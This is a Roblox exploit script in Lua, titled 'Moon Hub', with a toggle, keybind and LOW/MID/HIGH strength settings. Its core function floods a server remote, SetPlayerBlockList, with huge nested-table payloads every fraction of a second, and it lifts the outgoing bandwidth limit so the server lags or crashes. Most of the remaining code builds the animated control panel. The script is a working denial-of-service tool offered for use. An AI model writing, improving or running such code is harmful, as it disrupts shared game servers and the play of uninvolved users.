local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local ConfigFile = "moonhublagger.json"

local NIVELES = {
    LOW  = { poder = 25 },
    MID  = { poder = 32 },
    HIGH = { poder = 70 }
}

local boundKey = Enum.KeyCode.M
local nivelActual = "LOW"

local function SaveConfig()
    local data = {
        Keybind = boundKey and boundKey.Name or "...",
        Nivel = nivelActual
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            if data.Keybind and data.Keybind ~= "..." then
                boundKey = Enum.KeyCode[data.Keybind]
            else
                boundKey = nil
            end
            nivelActual = data.Nivel or "LOW"
        end)
    end
end
LoadConfig()

local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do 
        local t = {} 
        table.insert(z, t) 
        z = t 
    end
    local max = math.min(12000, poder * 50)
    for i = 1, max do 
        table.insert(main, spam) 
    end
    pcall(function() 
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
    end)
end

local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
    while laggerEnabled do
        pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
        bomb(NIVELES[nivelActual].poder)
        task.wait(0.18)
    end
end

local function stopLaggerLoop()
    laggerEnabled = false
    if laggerThread then
        task.cancel(laggerThread)
        laggerThread = nil
    end
end

local switchKnob, switchBg, toggleBtn, buttons, kbBtn

local function setToggle(newState)
    laggerEnabled = newState
    local goal = newState and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
    local color = newState and Color3.fromRGB(0, 130, 255) or Color3.fromRGB(30, 40, 65)
    
    if switchKnob and switchBg then
        TweenService:Create(switchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
        TweenService:Create(switchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()
    end

    if newState then
        if laggerThread then task.cancel(laggerThread) end
        laggerEnabled = true
        laggerThread = task.spawn(startLaggerLoop)
    else
        stopLaggerLoop()
    end
end

for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end

if not CoreGui:FindFirstChild("HiddenUI") then
    local f = Instance.new("Folder")
    f.Name = "HiddenUI"
    f.Parent = CoreGui
end
if CoreGui.HiddenUI:FindFirstChild("CrasherUI_Toggle") then
    CoreGui.HiddenUI.CrasherUI_Toggle:Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "CrasherUI_Toggle"
gui.ResetOnSpawn = false
gui.Parent = CoreGui.HiddenUI

local function createAnimatedStroke(parent, thickness, speed)
    local s = Instance.new("UIStroke")
    s.Thickness = thickness or 1.5
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Color = Color3.new(1, 1, 1)
    s.Parent = parent

    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 25, 60)),
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 140, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 140, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 25, 60)),
    })
    g.Rotation = 0
    g.Parent = s

    task.spawn(function()
        local spd = speed or 1.2
        while parent and parent.Parent and gui.Parent do
            g.Rotation = (g.Rotation + spd) % 360
            task.wait()
        end
    end)

    return s, g
end

-- GUI KÜÇÜLTÜLDÜ (Yüksekliği 175'ten 135'e düşürüldü)
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 220, 0, 135)
main.Position = UDim2.new(0.5, -110, 0.5, -67)
main.BackgroundColor3 = Color3.fromRGB(8, 12, 28)
main.BackgroundTransparency = 0.15
main.ClipsDescendants = true
main.Active = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = main

createAnimatedStroke(main, 2, 0.8)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -24, 0, 30)
title.Position = UDim2.new(0, 12, 0, 6)
title.BackgroundTransparency = 1
title.Text = "Moon Hub"
title.Font = Enum.Font.GothamBlack
title.TextSize = 16
title.TextColor3 = Color3.new(1, 1, 1)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

local titleGrad = Instance.new("UIGradient")
titleGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 160, 255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 160, 255)),
})
titleGrad.Parent = title

task.spawn(function()
    while main.Parent and gui.Parent do
        titleGrad.Rotation = (titleGrad.Rotation + 1.2) % 360
        task.wait()
    end
end)

local toggleRow = Instance.new("Frame")
toggleRow.Size = UDim2.new(1, -20, 0, 34)
toggleRow.Position = UDim2.new(0, 10, 0, 42)
toggleRow.BackgroundColor3 = Color3.fromRGB(18, 26, 48)
toggleRow.Parent = main

Instance.new("UICorner", toggleRow)
createAnimatedStroke(toggleRow, 1, 1.2)

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Size = UDim2.new(1, -125, 1, 0)
toggleLabel.Position = UDim2.new(0, 10, 0, 0)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Text = "Lagger"
toggleLabel.Font = Enum.Font.GothamBlack
toggleLabel.TextSize = 13
toggleLabel.TextColor3 = Color3.new(1, 1, 1)
toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
toggleLabel.Parent = toggleRow

switchBg = Instance.new("Frame")
switchBg.Size = UDim2.new(0, 36, 0, 18)
switchBg.Position = UDim2.new(1, -46, 0.5, -9)
switchBg.BackgroundTransparency = 1
switchBg.Parent = toggleRow

Instance.new("UICorner", switchBg).CornerRadius = UDim.new(0, 9)
createAnimatedStroke(switchBg, 2, 1.5)

switchKnob = Instance.new("Frame")
switchKnob.Size = UDim2.new(0, 14, 0, 14)
switchKnob.Position = UDim2.new(0, 2, 0.5, -7)
switchKnob.BackgroundColor3 = Color3.new(1, 1, 1)
switchKnob.Parent = switchBg

Instance.new("UICorner", switchKnob).CornerRadius = UDim.new(0, 7)

toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(1, -65, 1, 0) -- Keybind alanına tıklamayı engellemek için boyutu daraltıldı
toggleBtn.BackgroundTransparency = 1
toggleBtn.Text = ""
toggleBtn.Parent = toggleRow

toggleBtn.MouseButton1Click:Connect(function()
    setToggle(not laggerEnabled)
end)

-- YENİ KEYBIND BUTONU (Lagger yanına eklendi, efektli ve animasyonlu)
kbBtn = Instance.new("TextButton")
kbBtn.Size = UDim2.new(0, 55, 0, 20)
kbBtn.Position = UDim2.new(1, -110, 0.5, -10)
kbBtn.BackgroundColor3 = Color3.fromRGB(30, 42, 75)
kbBtn.AutoButtonColor = false
kbBtn.Font = Enum.Font.GothamBlack
kbBtn.TextSize = 10
kbBtn.TextColor3 = Color3.new(1, 1, 1)
kbBtn.Parent = toggleRow

Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 5)
createAnimatedStroke(kbBtn, 1.2, 1.2)

local function actualizarKeybindButton()
    kbBtn.Text = boundKey and (boundKey.Name) or "..."
end
actualizarKeybindButton()

local listeningForKey = false

kbBtn.MouseButton1Click:Connect(function()
    listeningForKey = true
    kbBtn.Text = "..."
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if listeningForKey then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            boundKey = input.KeyCode
            actualizarKeybindButton()
            listeningForKey = false
            SaveConfig()
        end
        return
    end
    if boundKey and input.KeyCode == boundKey then
        setToggle(not laggerEnabled)
    end
end)

-- SEVİYE BUTONLARI YUKARI KAYDIRILDI (Position 124'ten 84'e çekildi)
local modeRow = Instance.new("Frame")
modeRow.Size = UDim2.new(1, -20, 0, 34)
modeRow.Position = UDim2.new(0, 10, 0, 84)
modeRow.BackgroundTransparency = 1
modeRow.Parent = main

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 7)
UIListLayout.Parent = modeRow

buttons = {}
local function updateModeButtons()
    for name, btn in pairs(buttons) do
        if nivelActual == name then
            TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(0, 130, 255)}):Play()
        else
            TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(18, 26, 48)}):Play()
        end
    end
end

local function createModeButton(name, order)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 62, 1, 0)
    btn.LayoutOrder = order
    btn.BackgroundColor3 = Color3.fromRGB(18, 26, 48)
    btn.Font = Enum.Font.GothamBlack
    btn.Text = name
    btn.TextSize = 11
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.AutoButtonColor = false
    btn.Parent = modeRow

    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
    createAnimatedStroke(btn, 1.2, 1.2)
    
    buttons[name] = btn

    btn.MouseButton1Click:Connect(function()
        nivelActual = name
        updateModeButtons()
        SaveConfig()
    end)
end

createModeButton("LOW", 1)
createModeButton("MID", 2)
createModeButton("HIGH", 3)
updateModeButtons()

local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
